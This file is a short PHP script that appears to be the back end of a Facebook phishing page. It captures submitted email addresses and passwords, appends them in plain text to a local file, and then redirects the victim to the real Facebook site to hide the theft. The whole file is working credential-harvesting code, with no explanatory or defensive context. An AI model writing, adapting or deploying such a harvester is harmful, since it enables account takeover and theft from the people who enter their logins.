<?php 
	$Email=$_POST[Email];
	$Password=$_POST[password];
	
	$file=fopen("test.txt", "a");
	fwrite($file,"Email  $Email  password  $Password  \r\n");
	fclose($file);

	header("Location: https://www.facebook.com"); 
?>